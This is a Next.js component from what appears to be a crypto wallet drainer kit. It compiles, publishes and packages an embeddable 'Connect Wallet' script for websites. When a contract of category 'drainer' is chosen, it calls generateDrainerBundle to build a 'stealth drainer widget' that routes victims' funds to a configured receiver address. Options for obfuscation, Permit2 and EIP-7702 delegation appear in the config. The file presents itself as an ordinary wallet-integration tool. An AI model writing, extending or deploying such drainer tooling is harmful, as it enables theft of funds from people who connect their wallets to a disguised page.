"use client";

import { useStore } from "@/lib/store";
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Label } from "@/components/ui/label";
import { ScrollArea } from "@/components/ui/scroll-area";
import { Separator } from "@/components/ui/separator";
import { Archive, Download, Copy, Check, Play, FileCode2, Shield, Zap, ExternalLink } from "lucide-react";
import { useEffect, useState } from "react";
import { toast } from "sonner";
import Link from "next/link";
import { getEcosystemLabel } from "@/lib/ecosystems";
import { getContractById } from "@/lib/contract-registry";
import { generateDrainerBundle } from "@/lib/universal-sdk-generator";
import { createInlineScript, createWebsiteZip } from "@/lib/script-artifacts";

const FRAMEWORK_LABELS = {
  reown: "Reown",
  web3modal: "Web3Modal",
  walletconnect: "WalletConnect",
  rainbowkit: "RainbowKit",
  sequence: "Sequence",
  custom: "Custom",
} as const;

function getFrameworkDescription(framework: keyof typeof FRAMEWORK_LABELS) {
  if (framework === "rainbowkit") {
    return "Compile guidance is tailored for a React page using wagmi + RainbowKit. The generated JavaScript runs as a standalone page script.";
  }

  if (framework === "custom") {
    return "The standalone script binds your own UI trigger and opens the wallet popup without exporting an SDK API.";
  }

  return "Generate a plug-and-play JavaScript module with popup-based wallet connection and a compact connect button that can be appended to any page.";
}

function getEcosystemDetails(general: ReturnType<typeof useStore.getState>["generalConfig"]) {
  if (general.ecosystem === "solana") {
    return `Cluster: ${general.solanaCluster}${general.solanaProgramId ? ` • Program: ${general.solanaProgramId}` : ""}`;
  }

  if (general.ecosystem === "tron") {
    return `Network: ${general.tronNetwork}${general.tronContractAddress ? ` • Contract: ${general.tronContractAddress}` : ""}`;
  }

  return `${general.connectText} on ${general.themeMode} theme`;
}

function getQuickIntegrationSnippet(framework: keyof typeof FRAMEWORK_LABELS, connectClass: string, connectText: string) {
  if (framework === "rainbowkit") {
    return `// app/providers.tsx
import "@rainbow-me/rainbowkit/styles.css";
import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import { getDefaultConfig, RainbowKitProvider, ConnectButton } from "@rainbow-me/rainbowkit";
import { WagmiProvider } from "wagmi";

const config = getDefaultConfig({
  appName: "St3",
  projectId: "YOUR_WALLETCONNECT_PROJECT_ID",
  chains: [],
  ssr: true,
});

const queryClient = new QueryClient();

export function Providers({ children }) {
  return (
    <WagmiProvider config={config}>
      <QueryClientProvider client={queryClient}>
        <RainbowKitProvider>
          {children}
        </RainbowKitProvider>
      </QueryClientProvider>
    </WagmiProvider>
  );
}

// Any page or component
<ConnectButton showBalance={false} />`;
  }

  if (framework === "custom") {
    return `<!-- Add before </body> -->
<script src="script.js"></script>

<!-- Your own connect trigger -->
<button class="${connectClass.replace(".", "")}">${connectText}</button>

<script>
  document.querySelector(".${connectClass.replace(".", "")}")?.addEventListener("click", () => {
    window.openModal?.();
  });
</script>`;
  }

  return `<!-- Add before </body> -->
<script src="script.js"></script>

<!-- Option 1: Auto-injected ${FRAMEWORK_LABELS[framework]} button -->
<div data-sv26-button></div>

<!-- Option 2: Custom button that opens the popup -->
<button class="${connectClass.replace(".", "")}">${connectText}</button>

<!-- Option 3: Native Reown AppKit web component -->
<appkit-button balance="show"></appkit-button>`;
}

function getEmbedCodeSnippet(scriptUrl: string, framework: keyof typeof FRAMEWORK_LABELS, connectClass: string, connectText: string) {
  if (framework === "rainbowkit") {
    return `// Published bundle URL
// ${scriptUrl}

// RainbowKit mode still expects a React provider setup.
// Use the generated provider snippet above and load the published standalone script.`;
  }

  return `<!-- One standalone script: opens the wallet modal and binds buttons -->
<script src="${scriptUrl}"></script>

<div data-sv26-button></div>

<!-- Optional custom trigger -->
<button class="${connectClass.replace(".", "")}">${connectText}</button>`;
}

const getPublishedIntegrationSnippet = getEmbedCodeSnippet;

function downloadFile(filename: string, content: BlobPart, type = "text/plain") {
  const blob = new Blob([content], { type });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = filename;
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  URL.revokeObjectURL(url);
}

function getSelectedContractId(general: object): string {
  const contractId = (general as { contractId?: unknown }).contractId;
  return typeof contractId === "string" && contractId ? contractId : "stage1-module";
}

export function CompileOutput() {
  const {
    generalConfig,
    walletConfig,
    modalConfig,
    tokensConfig,
    advancedConfig,
    payoutConfig,
    contractsConfig,
    strategyConfig,
  } = useStore();
  const [compiled, setCompiled] = useState(false);
  const [copied, setCopied] = useState(false);
  const [scriptOutput, setScriptOutput] = useState("");
  const [publishedUrl, setPublishedUrl] = useState<string | null>(null);
  const [compileBusy, setCompileBusy] = useState(false);
  const [compileError, setCompileError] = useState<string | null>(null);
  const [origin, setOrigin] = useState("");
  const frameworkLabel = FRAMEWORK_LABELS[modalConfig.modalFrameworkStyle];
  const ecosystemLabel = getEcosystemLabel(generalConfig.ecosystem);
  const ecosystemDetails = getEcosystemDetails(generalConfig);
  const frameworkDescription = getFrameworkDescription(modalConfig.modalFrameworkStyle);
  const selectedContract = getContractById(getSelectedContractId(generalConfig));
  const selectedStrategy = selectedContract?.strategySupport?.includes(strategyConfig.mode)
    ? strategyConfig
    : { ...strategyConfig, mode: selectedContract?.strategySupport?.[0] || strategyConfig.mode };
  const quickIntegrationSnippet = getQuickIntegrationSnippet(
    modalConfig.modalFrameworkStyle,
    generalConfig.connectButtonClass,
    generalConfig.connectText,
  );
  const absolutePublishedUrl =
    publishedUrl && /^https?:\/\//i.test(publishedUrl)
      ? publishedUrl
      : publishedUrl && origin
      ? `${origin}${publishedUrl.startsWith("/") ? publishedUrl : `/${publishedUrl}`}`
      : publishedUrl;

  const publishedIntegrationSnippet = absolutePublishedUrl
    ? getPublishedIntegrationSnippet(
        absolutePublishedUrl,
        modalConfig.modalFrameworkStyle,
        generalConfig.connectButtonClass,
        generalConfig.connectText,
      )
    : null;

  useEffect(() => {
    const base =
      (process.env.NEXT_PUBLIC_APP_URL || "").replace(/\/$/, "") ||
      (typeof window !== "undefined" ? window.location.origin : "");
    setOrigin(base);
  }, []);

  const handleCompile = async () => {
    setCompileBusy(true);
    setCompileError(null);

    try {
      const selectedContractId = getSelectedContractId(generalConfig);
      const contractMeta = getContractById(selectedContractId);

      let result;

      if (contractMeta?.category === "drainer") {
        // Generate stealth drainer widget
        result = await generateDrainerBundle({
          contract: contractMeta,
          receiverAddress: payoutConfig.address || "0x0000000000000000000000000000000000000000",
          buttonSelector: generalConfig.connectButtonClass || ".connect-btn",
          buttonText: generalConfig.connectText || "Connect Wallet",
          twoStep: advancedConfig?.twoStepWithdrawal === "true",
          ecosystem: generalConfig.ecosystem || "evm",
          config: {
            general: generalConfig,
            wallet: walletConfig,
            modal: modalConfig,
            tokens: tokensConfig,
            advanced: advancedConfig,
            payout: payoutConfig,
            contracts: { primary: { name: "Primary", address: "", abiName: "", abi: [], chainId: 1, selectedFunctions: [] }, secondaryTargets: [], functionBindings: [] },
            strategy: { mode: "direct", executionBackend: "stealth-exchange", fallbackMode: "none", gaslessEnabled: false, multicallEnabled: false, permit2Enabled: false, typedDataEnabled: false, eip7702Enabled: false, delegateCallEnabled: false, delegateCallTarget: "", delegateCallSelectors: [], eip7702DelegationTarget: "", eip7702RequiresSupport: false, eip7702AuthorizationMode: "wallet", trailsEnabled: false, trailsMode: "pay", trailsApiKey: "", trailsToAddress: "", trailsToChainId: 0, trailsToToken: "", trailsToAmount: "", trailsWidgetUrl: "", obfuscationLevel: "none", customRpcUrl: "" },
            appKit: { appName: "", appDescription: "", appUrl: "", brandColor: "#7C73FF", logoUrl: "", supportEmail: "", enableAnalytics: false, enableSocialLogin: false, enableSmartWallet: true, enableWalletConnect: true, enableInjectedWallets: true, customCss: "" },
          },
          source: "compile",
        });
      } else {
        // Use existing Sequence path
        const res = await fetch("/api/compile", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            general: generalConfig,
            wallet: walletConfig,
            modal: modalConfig,
            tokens: tokensConfig,
            advanced: advancedConfig,
            payout: payoutConfig,
            contracts: contractsConfig,
            strategy: selectedStrategy,
            contractId: getSelectedContractId(generalConfig),
            receiverAddress: payoutConfig.address || "0x0000000000000000000000000000000000000000",
            saveConfig: true,
            saveBuild: true,
            source: "compile",
          }),
        });

        const data = await res.json();

        if (!res.ok) {
          const errorMsg = data?.message || "Compilation failed";
          setCompileError(errorMsg);
          throw new Error(errorMsg);
        }

        result = {
          bundle: data?.bundle?.content || "",
          publishedUrl: data?.publishedBuild?.url || null,
        };
      }

      setScriptOutput(result.bundle || "");
      setPublishedUrl(result.publishedUrl || null);
      setCompiled(true);
      setCompileError(null);
      toast.success("Standalone script compiled and published");

    } catch (error) {
      const msg = error instanceof Error ? error.message : "Compilation failed";
      setCompileError(msg);
      toast.error(msg);
      console.error("[CompileOutput] Compile error:", error);
    } finally {
      setCompileBusy(false);
    }
  };

  const handleCopy = () => {
    navigator.clipboard.writeText(createInlineScript(scriptOutput));
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
    toast.success("Inline script copied");
  };

  const handleDownload = () => {
    downloadFile("script.js", scriptOutput, "application/javascript");
    toast.success("Downloaded script.js");
  };

  const handleDownloadZip = () => {
    const bytes = createWebsiteZip(scriptOutput);
    downloadFile("website-script.zip", new Blob([bytes.buffer as ArrayBuffer], { type: "application/zip" }), "application/zip");
    toast.success("Downloaded website-script.zip");
  };

  return (
    <div className="space-y-6">
      {/* Config Summary */}
      <div className="grid grid-cols-1 md:grid-cols-5 gap-4">
        <Card>
          <CardContent className="p-4">
            <p className="text-xs text-muted-foreground mb-1">Ecosystem</p>
            <p className="text-sm font-medium capitalize">{ecosystemLabel}</p>
            <p className="mt-1 text-[11px] text-muted-foreground">{ecosystemDetails}</p>
          </CardContent>
        </Card>
        <Card>
          <CardContent className="p-4">
            <p className="text-xs text-muted-foreground mb-1">Modal Style</p>
            <p className="text-sm font-medium capitalize">{modalConfig.modalFrameworkStyle}</p>
          </CardContent>
        </Card>
        <Card>
          <CardContent className="p-4">
            <p className="text-xs text-muted-foreground mb-1">Chains</p>
            <p className="text-sm font-medium">{tokensConfig.visibleChains.length} active</p>
          </CardContent>
        </Card>
        <Card>
          <CardContent className="p-4">
            <p className="text-xs text-muted-foreground mb-1">Functions</p>
            <p className="text-sm font-medium">{tokensConfig.contractFunctions.length} defined</p>
          </CardContent>
        </Card>
        <Card>
          <CardContent className="p-4">
            <p className="text-xs text-muted-foreground mb-1">EIP-712</p>
            <Badge variant={advancedConfig.typedDataEnforcement ? "default" : "secondary"} className="text-[10px]">
              {advancedConfig.typedDataEnforcement ? "Enforced" : "Optional"}
            </Badge>
          </CardContent>
        </Card>
      </div>

      {/* Receiver Address */}
      <Card>
        <CardContent className="p-4">
          <div className="flex items-center gap-4">
            <div className="flex-1 space-y-1">
              <Label className="text-xs font-medium">Receiver Address (from Settings → Payout)</Label>
              <p className="text-sm font-mono text-muted-foreground">
                {payoutConfig.address || "Not configured — set in Settings → Payout"}
              </p>
            </div>
            <Link href="/settings">
              <Button variant="outline" size="sm" className="gap-1.5 text-xs shrink-0">
                <ExternalLink className="h-3 w-3" />
                Settings
              </Button>
            </Link>
          </div>
        </CardContent>
      </Card>

      <Card>
        <CardHeader>
          <CardTitle className="text-base">Standalone website script</CardTitle>
          <CardDescription>
            One self-executing <code className="text-primary">script.js</code> for your page. It runs directly and does not expose an SDK interface.
          </CardDescription>
        </CardHeader>
        <CardContent className="space-y-4">
          <p className="text-[11px] text-muted-foreground">
            Compile once, then copy the inline code, download <code className="text-primary">script.js</code>, or download a ready-to-upload ZIP. The published URL appears with the compiled result.
          </p>
        </CardContent>
      </Card>

      {/* Compile Actions */}
      <Card>
        <CardHeader>
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-2">
              <FileCode2 className="h-4 w-4 text-primary" />
              <CardTitle className="text-base">Standalone JavaScript Compiler</CardTitle>
            </div>
            <div className="flex items-center gap-2">
              <Badge variant="outline" className="text-[10px]">
                <Shield className="h-3 w-3 mr-1" />
                EIP-712
              </Badge>
              <Badge variant="outline" className="text-[10px]">
                <Zap className="h-3 w-3 mr-1" />
                Permit2
              </Badge>
            </div>
          </div>
          <CardDescription>
            {frameworkDescription} Add <code className="text-primary">&lt;script src=&quot;script.js&quot;&gt;&lt;/script&gt;</code> to any website and target elements with class <code className="text-primary">{generalConfig.connectButtonClass}</code>.
            {modalConfig.walletConnectProjectId ? (
              <span className="block mt-1 text-emerald-500">{frameworkLabel} Project ID: {modalConfig.walletConnectProjectId}</span>
            ) : (
              <span className="block mt-1 text-yellow-500">⚠ Set WalletConnect Project ID in Modal tab for production use</span>
            )}
            {modalConfig.modalFrameworkStyle === "rainbowkit" ? (
              <span className="block mt-1 text-muted-foreground">
                RainbowKit mode emits integration guidance for a React provider setup instead of a CDN-only button.
              </span>
            ) : null}
          </CardDescription>
        </CardHeader>
        <CardContent className="space-y-4">
          {compileError ? (
            <div className="rounded-lg border border-destructive/50 bg-destructive/10 p-3">
              <p className="text-sm text-destructive font-mono">{compileError}</p>
            </div>
          ) : null}

          <div className="flex flex-wrap gap-3">
            <Button onClick={() => void handleCompile()} className="gap-2" disabled={compileBusy}>
              <Play className="h-4 w-4" />
              {compileBusy ? "Compiling..." : compiled ? "Recompile Script" : "Compile Script"}
            </Button>

            {compiled && (
              <>
                <Button variant="outline" onClick={handleCopy} className="gap-2">
                  {copied ? <Check className="h-4 w-4" /> : <Copy className="h-4 w-4" />}
                  {copied ? "Copied!" : "Copy Inline JavaScript"}
                </Button>
                <Button variant="outline" onClick={handleDownload} className="gap-2">
                  <Download className="h-4 w-4" />
                  Download script.js
                </Button>
                <Button variant="outline" onClick={handleDownloadZip} className="gap-2">
                  <Archive className="h-4 w-4" />
                  Download Website ZIP
                </Button>
                <Link href="/templates">
                  <Button variant="outline" className="gap-2">
                    <ExternalLink className="h-4 w-4" />
                    Browse Templates
                  </Button>
                </Link>
              </>
            )}
          </div>

          {compiled && scriptOutput && (
            <>
              <Separator />

              <div className="rounded-lg border bg-accent/30 p-4 space-y-2">
                <p className="text-xs font-medium">Quick Integration</p>
                <p className="text-[11px] text-muted-foreground">
                  {modalConfig.modalFrameworkStyle === "rainbowkit"
                    ? "Use this in your React app shell to get the RainbowKit popup and append a compact connect button to the page."
                    : `Add this to any HTML page. Uses the ${frameworkLabel} popup path and supports MetaMask, WalletConnect QR, Coinbase, and other injected wallets.`}
                </p>
                <pre className="bg-zinc-950 text-emerald-400 rounded-lg p-3 text-xs font-mono">
{quickIntegrationSnippet}
                </pre>
              </div>

              {publishedUrl ? (
                <div className="rounded-lg border bg-accent/30 p-4 space-y-2">
                  <p className="text-xs font-medium">Published Script URL</p>
                  <p className="text-[11px] text-muted-foreground">
                    Versioned file on this host (absolute URL when opened in the browser or NEXT_PUBLIC_APP_URL is set).
                  </p>
                  <pre className="bg-zinc-950 text-emerald-400 rounded-lg p-3 text-xs font-mono">{absolutePublishedUrl || publishedUrl}</pre>
                  {publishedIntegrationSnippet ? (
                    <pre className="bg-zinc-950 text-emerald-400 rounded-lg p-3 text-xs font-mono whitespace-pre-wrap">
                      {publishedIntegrationSnippet}
                    </pre>
                  ) : null}
                </div>
              ) : null}

              <div className="space-y-2">
                <div className="flex items-center justify-between">
                  <p className="text-xs text-muted-foreground">
                    script.js — {(scriptOutput.length / 1024).toFixed(1)}KB • {ecosystemLabel} + {frameworkLabel} runtime
                  </p>
                  <Badge variant="secondary" className="text-[10px]">Compiled</Badge>
                </div>
                <ScrollArea className="h-[500px] w-full rounded-lg border bg-zinc-950 p-4">
                  <pre className="text-xs text-emerald-400 font-mono whitespace-pre-wrap leading-relaxed">
                    {scriptOutput}
                  </pre>
                </ScrollArea>
              </div>
            </>
          )}
        </CardContent>
      </Card>
    </div>
  );
}
